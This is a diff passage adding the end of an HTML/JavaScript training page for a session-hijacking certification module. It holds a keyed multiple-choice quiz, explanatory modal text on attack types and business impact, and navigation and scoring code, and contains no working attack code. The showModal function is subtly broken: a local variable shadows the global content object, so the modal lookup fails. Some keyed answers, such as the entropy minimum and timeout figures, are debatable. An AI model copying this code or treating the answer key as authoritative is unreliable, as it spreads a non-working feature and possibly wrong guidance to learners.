+                    "256 bits"
+                ],
+                correct: 2,
+                explanation: "The minimum recommended entropy for secure session tokens is 128 bits, which provides sufficient randomness to prevent brute-force and prediction attacks."
+            },
+            {
+                question: "Which SameSite cookie value provides the strongest CSRF protection?",
+                options: [
+                    "None",
+                    "Lax",
+                    "Strict",
+                    "Secure"
+                ],
+                correct: 2,
+                explanation: "SameSite=Strict provides the strongest CSRF protection by preventing the cookie from being sent with any cross-site requests, including navigation requests."
+            },
+            {
+                question: "What is man-in-the-browser (MITB) attack?",
+                options: [
+                    "A network-level attack using ARP poisoning",
+                    "Malware that intercepts browser communications",
+                    "A social engineering technique",
+                    "A DNS spoofing attack"
+                ],
+                correct: 1,
+                explanation: "Man-in-the-browser attacks involve malware running within the victim's browser that can intercept, monitor, and modify web communications in real-time."
+            },
+            {
+                question: "Which countermeasure helps prevent session fixation attacks?",
+                options: [
+                    "Using HTTPS only",
+                    "Implementing CSRF tokens",
+                    "Regenerating session IDs after authentication",
+                    "Enabling HttpOnly cookies"
+                ],
+                correct: 2,
+                explanation: "Regenerating session IDs after successful authentication prevents session fixation by ensuring that any pre-set session IDs are invalidated and replaced with new, secure identifiers."
+            },
+            {
+                question: "What is the primary purpose of device fingerprinting in session security?",
+                options: [
+                    "To identify unique users",
+                    "To detect session hijacking attempts",
+                    "To improve website performance",
+                    "To comply with privacy regulations"
+                ],
+                correct: 1,
+                explanation: "Device fingerprinting helps detect session hijacking by identifying when sessions are accessed from devices with different characteristics than the original authenticated session."
+            },
+            {
+                question: "Which attack vector exploits weak session ID generation algorithms?",
+                options: [
+                    "Session fixation",
+                    "Session prediction",
+                    "Cross-site scripting",
+                    "Man-in-the-middle"
+                ],
+                correct: 1,
+                explanation: "Session prediction attacks exploit weak or predictable session ID generation algorithms to guess valid session identifiers without needing to steal them."
+            },
+            {
+                question: "What is the recommended maximum absolute timeout for sensitive web applications?",
+                options: [
+                    "2-4 hours",
+                    "8-12 hours",
+                    "24 hours",
+                    "No limit needed"
+                ],
+                correct: 1,
+                explanation: "For sensitive applications, the recommended maximum absolute timeout is 8-12 hours, after which users must re-authenticate regardless of activity."
+            },
+            {
+                question: "Which HTTP header helps prevent clickjacking attacks that could lead to session compromise?",
+                options: [
+                    "Content-Security-Policy",
+                    "X-Frame-Options",
+                    "Strict-Transport-Security",
+                    "X-XSS-Protection"
+                ],
+                correct: 1,
+                explanation: "X-Frame-Options header prevents clickjacking attacks by controlling whether a page can be embedded in frames, which could be used to trick users into performing unwanted actions."
+            },
+            {
+                question: "In network-based session hijacking, what is 'blind hijacking'?",
+                options: [
+                    "Hijacking without network access",
+                    "Hijacking without seeing server responses",
+                    "Hijacking encrypted sessions",
+                    "Hijacking mobile applications"
+                ],
+                correct: 1,
+                explanation: "Blind hijacking occurs when an attacker can inject packets into a session but cannot see the server's responses, making it more difficult but still possible to maintain session control."
+            },
+            {
+                question: "What is the primary security benefit of using ephemeral keys in TLS?",
+                options: [
+                    "Faster encryption performance",
+                    "Perfect Forward Secrecy",
+                    "Reduced bandwidth usage",
+                    "Simplified key management"
+                ],
+                correct: 1,
+                explanation: "Ephemeral keys provide Perfect Forward Secrecy, ensuring that even if long-term private keys are compromised, past session communications remain secure."
+            },
+            {
+                question: "Which detection method is most effective for identifying geographically impossible login scenarios?",
+                options: [
+                    "Behavioral biometrics",
+                    "Device fingerprinting",
+                    "IP geolocation analysis",
+                    "Session token validation"
+                ],
+                correct: 2,
+                explanation: "IP geolocation analysis can detect impossible travel scenarios where a user appears to log in from distant geographic locations within an impossibly short time frame."
+            },
+            {
+                question: "What is the main advantage of using JSON Web Tokens (JWT) for session management?",
+                options: [
+                    "Faster server processing",
+                    "Stateless session handling",
+                    "Better encryption",
+                    "Smaller token size"
+                ],
+                correct: 1,
+                explanation: "JWTs enable stateless session handling as all necessary session information is contained within the token itself, reducing server-side session storage requirements."
+            },
+            {
+                question: "Which attack combines social engineering with session hijacking?",
+                options: [
+                    "TCP hijacking",
+                    "Session fixation via phishing",
+                    "ARP poisoning",
+                    "SSL stripping"
+                ],
+                correct: 1,
+                explanation: "Session fixation attacks often use social engineering (like phishing emails) to trick users into clicking links with predetermined session IDs or visiting malicious sites."
+            },
+            {
+                question: "What should be the immediate first response when session hijacking is detected?",
+                options: [
+                    "Monitor the attacker's activities",
+                    "Immediately terminate all potentially compromised sessions",
+                    "Change all user passwords",
+                    "Restart the web server"
+                ],
+                correct: 1,
+                explanation: "The immediate first response should be to terminate all potentially compromised sessions to prevent further unauthorized access while preparing additional response measures."
+            },
+            {
+                question: "Which mechanism helps prevent replay attacks on session tokens?",
+                options: [
+                    "Token binding to client characteristics",
+                    "Longer session timeouts",
+                    "Multiple authentication factors",
+                    "HTTPS encryption"
+                ],
+                correct: 0,
+                explanation: "Token binding to client characteristics (like IP address, user agent, or client certificates) helps prevent replay attacks by making stolen tokens unusable from different contexts."
+            }
+        ];
+
+        // Modal content definitions
+        const modalContent = {
+            sessionOverview: {
+                title: "🎭 What is Session Hijacking?",
+                content: `
+                    <h3>Session Hijacking Fundamentals</h3>
+                    <p>Session hijacking is a sophisticated attack where cybercriminals take control of legitimate user sessions by exploiting vulnerabilities in session management mechanisms.</p>
+                    
+                    <h4>🔍 How Sessions Work</h4>
+                    <ul>
+                        <li><strong>Authentication:</strong> User provides credentials</li>
+                        <li><strong>Session Creation:</strong> Server generates unique session ID</li>
+                        <li><strong>Token Distribution:</strong> Session ID sent to client</li>
+                        <li><strong>Request Validation:</strong> Session ID validated on each request</li>
+                        <li><strong>Session Termination:</strong> Logout or timeout ends session</li>
+                    </ul>
+                    
+                    <h4>⚡ Attack Mechanism</h4>
+                    <p>Attackers bypass the authentication process by stealing, predicting, or manipulating session tokens, allowing them to impersonate legitimate users without knowing their credentials.</p>
+                `
+            },
+            sessionTypes: {
+                title: "🔄 Types of Session Attacks",
+                content: `
+                    <h3>Session Attack Classification</h3>
+                    
+                    <h4>🌐 Network-Level Attacks</h4>
+                    <ul>
+                        <li><strong>TCP Hijacking:</strong> Exploiting TCP connection state</li>
+                        <li><strong>UDP Session Attacks:</strong> Predicting transaction IDs</li>
+                        <li><strong>IP Spoofing:</strong> Impersonating legitimate hosts</li>
+                        <li><strong>Man-in-the-Middle:</strong> Intercepting communications</li>
+                    </ul>
+                    
+                    <h4>💻 Application-Level Attacks</h4>
+                    <ul>
+                        <li><strong>Session Fixation:</strong> Forcing predetermined session IDs</li>
+                        <li><strong>XSS Token Theft:</strong> JavaScript-based cookie stealing</li>
+                        <li><strong>CSRF Attacks:</strong> Cross-site request forgery</li>
+                        <li><strong>Session Prediction:</strong> Exploiting weak token generation</li>
+                    </ul>
+                `
+            },
+            sessionImpact: {
+                title: "💥 Business Impact",
+                content: `
+                    <h3>Consequences of Session Hijacking</h3>
+                    
+                    <h4>💰 Financial Impact</h4>
+                    <ul>
+                        <li>Unauthorized financial transactions</li>
+                        <li>Data breach costs and fines</li>
+                        <li>Business disruption expenses</li>
+                        <li>Legal liability and litigation costs</li>
+                    </ul>
+                    
+                    <h4>📊 Operational Impact</h4>
+                    <ul>
+                        <li>Service unavailability and downtime</li>
+                        <li>Customer trust and reputation damage</li>
+                        <li>Regulatory compliance violations</li>
+                        <li>Incident response and recovery costs</li>
+                    </ul>
+                    
+                    <h4>🎯 Common Target Scenarios</h4>
+                    <ul>
+                        <li>Online banking and financial services</li>
+                        <li>E-commerce and payment systems</li>
+                        <li>Healthcare and patient data systems</li>
+                        <li>Corporate enterprise applications</li>
+                    </ul>
+                `
+            }
+        };
+
+        // Initialize the application
+        function init() {
+            showSection('overview');
+            updateProgress();
+            setupKeyboardNavigation();
+        }
+
+        // Show specific section
+        function showSection(sectionName) {
+            // Hide all sections
+            document.querySelectorAll('.module-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            // Show target section
+            const targetSection = document.getElementById(sectionName);
+            if (targetSection) {
+                targetSection.classList.add('active');
+                currentSection = sectionName;
+                completedSections.add(sectionName);
+                
+                // Update navigation
+                document.querySelectorAll('.nav-btn').forEach(btn => {
+                    btn.classList.remove('active');
+                });
+                
+                const activeBtn = document.querySelector(`[onclick="showSection('${sectionName}')"]`);
+                if (activeBtn) {
+                    activeBtn.classList.add('active');
+                }
+                
+                // Update progress
+                updateProgress();
+                
+                // Scroll to top
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            }
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const totalSections = sectionOrder.length - 1; // Exclude quiz from progress
+            const completedCount = Array.from(completedSections).filter(section => section !== 'quiz').length;
+            const percentage = Math.round((completedCount / totalSections) * 100);
+            
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            
+            if (progressBar && progressText) {
+                progressBar.style.width = percentage + '%';
+                progressBar.innerHTML = `${percentage}%`;
+                progressText.textContent = `Progress: ${percentage}% Complete`;
+            }
+        }
+
+        // Show modal with specific content
+        function showModal(contentKey) {
+            const modal = document.getElementById('detailModal');
+            const modalContent = document.getElementById('modalContent');
+            
+            if (modal && modalContent && modalContent[contentKey]) {
+                modalContent.innerHTML = `
+                    <h2>${modalContent[contentKey].title}</h2>
+                    ${modalContent[contentKey].content}
+                `;
+                modal.style.display = 'block';
+            }
+        }
+
+        // Close modal
+        function closeModal() {
+            const modal = document.getElementById('detailModal');
+            if (modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Start quiz
+        function startQuiz() {
+            const quizContainer = document.getElementById('quizContainer');
+            if (!quizContainer) return;
+            
+            quizStartTime = Date.now();
+            currentQuestionIndex = 0;
+            quizAnswers = {};
+            
+            renderQuiz();
+        }
+
+        // Render quiz questions
+        function renderQuiz() {
+            const quizContainer = document.getElementById('quizContainer');
+            if (!quizContainer) return;
+            
+            let quizHTML = '<h3>🎯 Session Hijacking Assessment</h3>';
+            
+            quizQuestions.forEach((question, index) => {
+                quizHTML += `
+                    <div class="question">
+                        <h4>Question ${index + 1}: ${question.question}</h4>
+                        <ul class="options">
+                            ${question.options.map((option, optIndex) => `
+                                <li onclick="selectAnswer(${index}, ${optIndex})" data-question="${index}" data-option="${optIndex}">
+                                    ${String.fromCharCode(65 + optIndex)}. ${option}
+                                </li>
+                            `).join('')}
+                        </ul>
+                    </div>
+                `;
+            });
+            
+            quizHTML += `
+                <div style="text-align: center; margin: 30px 0;">
+                    <button class="btn btn-success" onclick="submitQuiz()">Submit Assessment</button>
+                </div>
+            `;
+            
+            quizContainer.innerHTML = quizHTML;
+        }
+
+        // Select quiz answer
+        function selectAnswer(questionIndex, optionIndex) {
+            // Remove previous selections
+            const questionOptions = document.querySelectorAll(`[data-question="${questionIndex}"]`);
+            questionOptions.forEach(option => option.classList.remove('selected'));
+            
+            // Add selection to clicked option
+            const selectedOption = document.querySelector(`[data-question="${questionIndex}"][data-option="${optionIndex}"]`);
+            if (selectedOption) {
+                selectedOption.classList.add('selected');
+                quizAnswers[questionIndex] = optionIndex;
+            }
+        }
+
+        // Submit quiz
+        function submitQuiz() {
+            const totalQuestions = quizQuestions.length;
+            const answeredQuestions = Object.keys(quizAnswers).length;
+            
+            if (answeredQuestions < totalQuestions) {
+                alert(`Please answer all questions. You have answered ${answeredQuestions} out of ${totalQuestions} questions.`);
+                return;
+            }
+            
+            calculateResults();
+        }
+
+        // Calculate quiz results
+        function calculateResults() {
+            let correctAnswers = 0;
+            const totalQuestions = quizQuestions.length;
+            const quizDuration = Math.round((Date.now() - quizStartTime) / 1000 / 60);
+            
+            // Check answers and update UI
+            quizQuestions.forEach((question, index) => {
+                const userAnswer = quizAnswers[index];
+                const correctAnswer = question.correct;
+                const questionOptions = document.querySelectorAll(`[data-question="${index}"]`);
+                
+                questionOptions.forEach((option, optIndex) => {
+                    if (optIndex === correctAnswer) {
+                        option.classList.add('correct');
+                    } else if (optIndex === userAnswer && userAnswer !== correctAnswer) {
+                        option.classList.add('incorrect');
+                    }
+                });
+                
+                if (userAnswer === correctAnswer) {
+                    correctAnswers++;
+                }
+            });
+            
+            quizScore = Math.round((correctAnswers / totalQuestions) * 100);
+            const passed = quizScore >= 80;
+            
+            // Show results
+            displayResults(correctAnswers, totalQuestions, quizScore, passed, quizDuration);
+        }
+
+        // Display quiz results
+        function displayResults(correct, total, percentage, passed, duration) {
+            const resultsContainer = document.getElementById('quizResults');
+            const resultsContent = document.getElementById('resultsContent');
+            
+            if (!resultsContainer || !resultsContent) return;
+            
+            const statusColor = passed ? 'var(--success-color)' : 'var(--accent-color)';
+            const statusIcon = passed ? '✅' : '❌';
+            const statusText = passed ? 'PASSED' : 'FAILED';
+            
+            resultsContent.innerHTML = `
+                <div style="text-align: center; margin: 20px 0;">
+                    <div style="font-size: 3rem; margin: 20px 0;">${statusIcon}</div>
+                    <h3 style="color: ${statusColor}; font-size: 2rem;">${statusText}</h3>
+                    <div style="font-size: 2.5rem; margin: 20px 0; color: ${statusColor};">${percentage}%</div>
+                </div>
+                
+                <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                    <h4>📊 Detailed Results</h4>
+                    <ul style="list-style: none; padding: 0;">
+                        <li><strong>Correct Answers:</strong> ${correct} out of ${total}</li>
+                        <li><strong>Score:</strong> ${percentage}%</li>
+                        <li><strong>Time Taken:</strong> ${duration} minutes</li>
+                        <li><strong>Passing Score:</strong> 80%</li>
+                        <li><strong>Status:</strong> <span style="color: ${statusColor};">${statusText}</span></li>
+                    </ul>
+                </div>
+                
+                <div style="background: var(--gradient-primary); padding: 20px; border-radius: 10px; color: white; margin: 20px 0;">
+                    <h4>🎯 Performance Analysis</h4>
+                    <p>${getPerformanceMessage(percentage)}</p>
+                </div>
+                
+                <div style="text-align: center; margin: 20px 0;">
+                    ${passed ? 
+                        '<button class="btn btn-success" onclick="generateCertificate()">🏆 Generate Certificate</button>' : 
+                        '<button class="btn btn-warning" onclick="startQuiz()">🔄 Retake Assessment</button>'
+                    }
+                    <button class="btn btn-primary" onclick="showSection(\'overview\')" style="margin-left: 10px;">📚 Review Module</button>
+                </div>
+            `;
+            
+            resultsContainer.style.display = 'block';
+            
+            // Scroll to results
+            resultsContainer.scrollIntoView({behavior: 'smooth'});
+        }
+
+        // Get performance message based on score
+        function getPerformanceMessage(score) {
+            if (score >= 95) {
+                return "🌟 Outstanding! You have mastered session hijacking concepts and are ready for advanced penetration testing challenges.";
+            } else if (score >= 85) {
+                return "🎉 Excellent work! You demonstrate strong understanding of session security principles and attack methodologies.";
+            } else if (score >= 80) {
+                return "✅ Good job! You've passed the assessment and show solid comprehension of session hijacking fundamentals.";
+            } else if (score >= 70) {
+                return "📚 Close! Review the session management countermeasures and detection methods sections before retaking the assessment.";
+            } else {
+                return "🔄 Additional study needed. Focus on understanding the different types of session attacks and their mitigation strategies.";
+            }
+        }
+
+        // Generate certificate (placeholder)
+        function generateCertificate() {
+            alert("🏆 Certificate generation feature would be implemented in a full LMS system. You have successfully completed CEH v13 Module 11: Session Hijacking!");
+        }
+
+        // Setup keyboard navigation
+        function setupKeyboardNavigation() {
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Escape') {
+                    closeModal();
+                } else if (event.key === 'ArrowLeft') {
+                    navigateSection(-1);
+                } else if (event.key === 'ArrowRight') {
+                    navigateSection(1);
+                }
+            });
+        }
+
+        // Navigate between sections
+        function navigateSection(direction) {
+            const currentIndex = sectionOrder.indexOf(currentSection);
+            let newIndex = currentIndex + direction;
+            
+            if (newIndex >= 0 && newIndex < sectionOrder.length) {
+                showSection(sectionOrder[newIndex]);
+            }
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('detailModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        // Initialize application when DOM loads
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
+                                
